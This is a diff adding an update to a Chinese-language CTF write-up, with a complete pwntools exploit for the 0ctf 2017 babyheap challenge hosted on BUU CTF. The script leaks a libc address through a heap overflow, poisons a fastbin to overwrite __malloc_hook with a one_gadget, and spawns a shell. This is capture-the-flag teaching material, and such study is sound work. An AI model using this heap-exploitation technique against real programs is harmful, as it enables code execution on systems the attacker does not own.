@@ -129,6 +129,99 @@ if __name__ == "__main__":
     main()
 ```
 
+upd on 26/04/02
+
+BUU CTF 上有一道完全相同的题目。
+
+[题目链接](https://buuoj.cn/challenges#0ctf_2017_babyheap)
+
+但是我按照相同的思路去做的时候并没有做出来，究其原因，是因为上面那份代码在申请 chunk_4 和 chunk_5 的时候，恰好 0x20 + 0x70 = 0x90 让在 unsortedbins 中存在的 chunk_2 切完了。
+
+但是这一点并没能在上面提到，所以这里补充一个新的脚本：
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27226
+io = remote(host,port)
+# io = process("./0ctf_2017_babyheap")
+elf = ELF("./0ctf_2017_babyheap")
+libc = ELF("./libc-2.23.so")
+
+def Allocate(size):
+    io.recvuntil(b"Command: ")
+    io.sendline(b'1')
+    io.recvuntil(b"Size: ")
+    io.sendline(str(size).encode())
+    # index = io.recvline()
+    # print("[*] SUCCESS FOR",index)    
+
+def Fill(index,content):
+    io.recvuntil(b"Command: ")
+    io.sendline(b'2')
+    io.recvuntil(b"Index: ")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"Size: ")
+    io.sendline(str(len(content)).encode())
+    io.recvuntil(b"Content: ")
+    io.send(content)
+
+def Free(index):
+    io.recvuntil(b"Command: ")
+    io.sendline(b'3')
+    io.recvuntil(b"Index: ")
+    io.sendline(str(index).encode())
+
+def Dump(index):
+    io.recvuntil(b"Command: ")
+    io.sendline(b'4')
+    io.recvuntil(b"Index: ")
+    io.sendline(str(index).encode())
+
+
+def main():
+    Allocate(0x20)  # index 0
+    Allocate(0x10)  # index 1
+    Allocate(0x70)  # index 2
+    Allocate(0x20)  # index 3 for guard
+    payload_0 = b'A'*0x20 + p64(0) + p64(0xA1)
+    Fill(0,payload_0)
+    Free(1)
+    Allocate(0x10)  # index 1 reborn
+    Dump(2)
+    io.recvuntil(b"Content: \n")
+    leak_data = io.recvn(8)
+    leak_addr = u64(leak_data)
+    print("\n[+] Leak main_arena+88 address :",hex(leak_addr))
+    malloc_hook_addr = leak_addr - 0x68
+    print("\n[+] Leak __malloc_hook address :",hex(malloc_hook_addr))
+    libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    one_gadget_offset = 0x4526a
+    one_gadget = one_gadget_offset + libc_base
+    print("\n[+] Leak one_gadget address :",hex(one_gadget))
+    Allocate(0x70)  # index 4 for index 2 reborn
+    Allocate(0x10)  # index 5
+    Allocate(0x60)  # index 6
+    Free(6)
+    payload_1 = b'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
+    Fill(5,payload_1)
+    Allocate(0x60)  # index 6 reborn
+    Allocate(0x60)  # index 7 Allocate __malloc_hook - 0x23
+    payload_2 = b'A'*0x13 + p64(one_gadget)
+    Fill(7,payload_2)
+    Allocate(256)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
 ### easyheap
 
 [题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)
